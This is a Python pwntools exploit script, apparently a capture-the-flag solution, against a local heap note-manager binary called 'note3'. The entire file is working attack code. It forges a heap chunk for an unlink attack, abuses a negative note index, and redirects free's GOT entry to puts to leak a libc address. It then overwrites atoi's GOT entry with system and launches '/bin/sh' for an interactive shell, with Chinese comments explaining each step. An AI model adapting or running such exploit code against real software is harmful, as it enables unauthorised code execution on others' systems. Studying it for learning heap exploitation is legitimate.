# -*- coding: utf-8 -*-
from pwn import *

p = process( './note3' )

free_got = 0x602018

alarm_got = 0x602038

puts_plt = 0x400730

atoi_got = 0x602070

atoi_libc = 0x362c0

system_libc = 0x41490

def new_note(  size , content ) :
    p.sendlineafter ( 'option--->>\n' , '1' )
    p.sendlineafter ( 'Input the length of the note content:(less than 1024)\n' , str( size ) )
    p.sendlineafter ( 'Input the note content:\n' , content )

def del_note ( id ) :
    p.sendlineafter ( 'option--->>\n' , '4' )
    p.sendlineafter ( 'Input the id of the note:\n' , str( id ) )

def edit( id , content ) :
    p.sendlineafter ( 'option--->>\n' , '3' )
    p.sendlineafter ( 'Input the id of the note:\n' , str( id ) )
    p.sendlineafter ( 'Input the new content:\n' , content )

def pwn() :
    new_note( 512 , 'a' * 64 )
    new_note( 512 , 'b' * 64 )
    new_note( 512 , 'c' * 64 )
    new_note( 512 , 'd' * 64 )
    new_note( 512 , 'e' * 64 )
    new_note( 512 , 'f' * 64 )
    new_note( 512 , 'g' * 64 )
    edit( 2 , 'c' * 64 )
    payload = p64( 0 ) + p64( 0x201 ) + p64( 0x6020d8 -0x18 ) + p64( 0x6020d8 - 0x10 ) +'c' * ( 512 - 32 ) +  p64( 0x200 ) + p64( 0x210)
    edit( -9223372036854775808 , payload )
    del_note( 3 )#伪造chunk头，使得note2的指针改写成自己的前十八个字节的位置
    edit ( 2 , p64( 0 ) + p64( free_got ) + p64( atoi_got ) + p64( atoi_got ) )#把free_got表项改成puts_plt项，下次调用free时相当于调用puts
    edit( 0 , p64( puts_plt )[:6]  )#如果不加上[:6］会修改下个表项低字节为０，导致出错不能运行
    del_note ( 1 )
    atoi_add  = u64 ( p.recvline()[:-1].ljust( 8 , '\x00' ) )# leak atoi_got中的地址
    system_add = atoi_add - atoi_libc + system_libc
    edit( 2 , p64( system_add ) )
    p.sendlineafter ( 'option--->>\n' , '/bin/sh' )
    p.interactive()


if __name__ == '__main__' :
    pwn()
